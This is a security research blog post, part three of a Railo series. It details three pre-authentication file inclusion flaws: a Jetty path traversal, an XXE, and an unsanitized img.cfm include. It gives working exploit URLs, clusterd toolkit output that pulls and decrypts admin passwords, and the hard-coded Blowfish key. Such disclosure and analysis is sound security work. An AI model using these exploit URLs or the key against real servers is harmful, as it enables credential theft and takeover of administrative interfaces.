---
categories:
- railo
- clusterd
comments: false
date: "2014-08-23T15:00:00Z"
title: railo security - part three - pre-authentication LFI
---

*[Part one - intro](http://hatriot.github.io/blog/2014/06/25/railo-security-part-one/)*  
*[Part two - post-authentication rce](http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/)*  
*Part three - pre-authentication LFI*  
*[Part four - pre-authentication rce](http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/)*  


This post continues our four part Railo security analysis with three pre-authentication LFI vulnerabilities.  These allow anonymous users access to retrieve the administrative plaintext password and login to the server's administrative interfaces.  If you're unfamiliar with Railo, I recommend at the very least reading part one of this series.  The most significant LFI discussed has been implemented as auxiliary modules in [clusterd](http://github.com/hatRiot/clusterd), though they're pretty trivial to exploit on their own.

We'll kick this portion off by introducing a pre-authentication LFI vulnerability that affects all versions of Railo Express; if you're unfamiliar with the Express install, it's really just a self-contained, no-installation-necessary package that harnesses Jetty to host the service.   The flaw actually has nothing to do with Railo itself, but rather in this packaged web server, Jetty.  [CVE-2007-6672](http://www.cvedetails.com/cve/CVE-2007-6672/) addresses this issue, but it appears that the Railo folks have not bothered to update this.  Via the browser, we can pull the config file, complete with the admin hash, with `http://[host]:8888/railo-context/admin/..\..\railo-web.xml.cfm`.

A quick run of this in clusterd on Railo 4.0:

```
$ ./clusterd.py -i 192.168.1.219 -a railo -v4.0 --rl-pw

        clusterd/0.3 - clustered attack toolkit
            [Supporting 6 platforms]

 [2014-05-15 06:25PM] Started at 2014-05-15 06:25PM
 [2014-05-15 06:25PM] Servers' OS hinted at windows
 [2014-05-15 06:25PM] Fingerprinting host '192.168.1.219'
 [2014-05-15 06:25PM] Server hinted at 'railo'
 [2014-05-15 06:25PM] Checking railo version 4.0 Railo Server...
 [2014-05-15 06:25PM] Checking railo version 4.0 Railo Server Administrator...
 [2014-05-15 06:25PM] Checking railo version 4.0 Railo Web Administrator...
 [2014-05-15 06:25PM] Matched 3 fingerprints for service railo
 [2014-05-15 06:25PM]   Railo Server (version 4.0)
 [2014-05-15 06:25PM]   Railo Server Administrator (version 4.0)
 [2014-05-15 06:25PM]   Railo Web Administrator (version 4.0)
 [2014-05-15 06:25PM] Fingerprinting completed.
 [2014-05-15 06:25PM] Attempting to pull password...
 [2014-05-15 06:25PM] Fetched encrypted password, decrypting...
 [2014-05-15 06:25PM] Decrypted password: default
 [2014-05-15 06:25PM] Finished at 2014-05-15 06:25PM
```

and on the latest release of Railo, 4.2:

```
$ ./clusterd.py -i 192.168.1.219 -a railo -v4.2 --rl-pw

        clusterd/0.3 - clustered attack toolkit
            [Supporting 6 platforms]

 [2014-05-15 06:28PM] Started at 2014-05-15 06:28PM
 [2014-05-15 06:28PM] Servers' OS hinted at windows
 [2014-05-15 06:28PM] Fingerprinting host '192.168.1.219'
 [2014-05-15 06:28PM] Server hinted at 'railo'
 [2014-05-15 06:28PM] Checking railo version 4.2 Railo Server...
 [2014-05-15 06:28PM] Checking railo version 4.2 Railo Server Administrator...
 [2014-05-15 06:28PM] Checking railo version 4.2 Railo Web Administrator...
 [2014-05-15 06:28PM] Matched 3 fingerprints for service railo
 [2014-05-15 06:28PM]   Railo Server (version 4.2)
 [2014-05-15 06:28PM]   Railo Server Administrator (version 4.2)
 [2014-05-15 06:28PM]   Railo Web Administrator (version 4.2)
 [2014-05-15 06:28PM] Fingerprinting completed.
 [2014-05-15 06:28PM] Attempting to pull password...
 [2014-05-15 06:28PM] Fetched password hash: d34535cb71909c4821babec3396474d35a978948455a3284fd4e1bc9c547f58b
 [2014-05-15 06:28PM] Finished at 2014-05-15 06:28PM
```

Using this LFI, we can pull the `railo-web.xml.cfm` file, which contains the administrative password.  Notice that 4.2 only dumps a hash, whilst 4.0 dumps a plaintext password.  This is because versions <= 4.0 blowfish encrypt the password, and > 4.0 actually hashes it.  Here's the relevant code from Railo (ConfigWebFactory.java):

```
private static void loadRailoConfig(ConfigServerImpl configServer, ConfigImpl config, Document doc) throws IOException  {
        Element railoConfiguration = doc.getDocumentElement();

        // password
        String hpw=railoConfiguration.getAttribute("pw");
        if(StringUtil.isEmpty(hpw)) {
            // old password type
            String pwEnc = railoConfiguration.getAttribute("password"); // encrypted password (reversable)
            if (!StringUtil.isEmpty(pwEnc)) {
                String pwDec = new BlowfishEasy("tpwisgh").decryptString(pwEnc);
                hpw=hash(pwDec);
            }
        }
        if(!StringUtil.isEmpty(hpw))
            config.setPassword(hpw);
        else if (configServer != null) {
            config.setPassword(configServer.getDefaultPassword());
        }
``` 

As above, they actually encrypted the password using a hard-coded symmetric key; this is where versions <= 4.0 stop.  In > 4.0, after decryption they hash the password (SHA256) and use it as such.  Note that the encryption/decryption is no longer the actual password in > 4.0, so we cannot simply decrypt the value to use and abuse.

Due to the configuration of the web server, we can only pull CFM files; this is fine for the configuration file, but system files prove troublesome...

{{< figure src="http://diyblogger.net/wp-content/uploads/2010/12/billy-mays.jpg" >}}

The second LFI is a trivial XXE that affects versions <= 4.0, and is exploitable out-of-the-box with Metasploit.  Unlike the Jetty LFI, this affects all versions of Railo, both installed and express:

{{< figure src="/images/posts/2014/railo/railo-xxe-msf.jpg" >}}

Using this we cannot pull `railo-web.xml.cfm` due to it containing XML headers, and we cannot use the standard OOB methods for retrieving files.  Timothy Morgan gave a great [talk](http://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf) at OWASP Appsec 2013 that detailed a neat way of abusing Java XML parsers to obtain RCE via XXE.  The process is pretty interesting; if you submit a URL with a jar:// protocol handler, the server will download the zip/jar to a temporary location, perform some header parsing, and then delete it.  However, if you push the file and leave the connection open, the file will persist.  This vector, combined with one of the other LFI's, could be a reliable pre-authentication RCE, but I was unable to get it working.

The third LFI is just as trivial as the first two, and again stems from the pandemic problem of failing to authenticate at the URL/page level.  `img.cfm` is a file used to, you guessed it, pull images from the system for display.  Unfortunately, it fails to sanitize anything:

```
<cfset path="resources/img/#attributes.src#.cfm">
<cfparam name="application.adminimages" default="#{}#">
<cfif StructKeyExists(application.adminimages,path) and false>
    <cfset str=application.adminimages[path]>
<cfelse>
    <cfsavecontent variable="str" trim><cfinclude template="#path#"></cfsavecontent>
    <cfset application.adminimages[path]=str>
</cfif>
```

By fetching this page with `attributes.src` set to another CFM file off elsewhere, we can load the file and execute any tags contained therein.  As we've done above, lets grab `railo-web.xml.cfm`; we can do this with the following url: `http://host:8888/railo-context/admin/img.cfm?attributes.src=../../../../railo-web.xml&thistag.executionmode=start` which simply returns

```
<?xml version="1.0" encoding="UTF-8"?><railo-configuration pw="d34535cb71909c4821babec3396474d35a978948455a3284fd4e1bc9c547f58b" version="4.2">
```

This vulnerability exists in 3.3 - 4.2.1 (latest), and is exploitable out-of-the-box on both Railo installed and Express editions.  Though you can only pull CFM files, the configuration file dumps plenty of juicy information.  It may also be beneficial for custom tags, plugins, and custom applications that may house other vulnerable/sensitive information hidden away from the URL.

Curiously, at first glance it looks like it may be possible to turn this LFI into an RFI.  Unfortunately it's not quite that simple; if we attempt to access a non-existent file, we see the following:

```
The error occurred in zip://C:\Documents and Settings\bryan\My Documents\Downloads\railo\railo-express-4.2.1.000-jre-win32\webapps\ROOT\WEB-INF\railo\context\railo-context.ra!/admin/img.cfm: line 29
```

Notice the `zip://` handler.  This prevents us from injecting a path to a remote host with any other handler.  If, however, the tag looked like this:

```
<cfinclude>#attributes.src#</cfinclude>
```

Then it would have been trivially exploitable via RFI.  As it stands, it's not possible to modify the handler without prior code execution.

To sum up the LFI's: all versions and all installs are vulnerable via the `img.cfm` vector.  All versions and all express editions are vulnerable via the Jetty LFI.  Versions <= 4.0 and all installs are vulnerable to the XXE vector.  This gives us reliable LFI in all current versions of Railo.

This concludes our pre-authentication LFI portion of this assessment, which will crescendo with our final post detailing several pre-authentication RCE vulnerabilities.  I expect a quick turnaround for part four, and hope to have it out in a few days.  Stay tuned!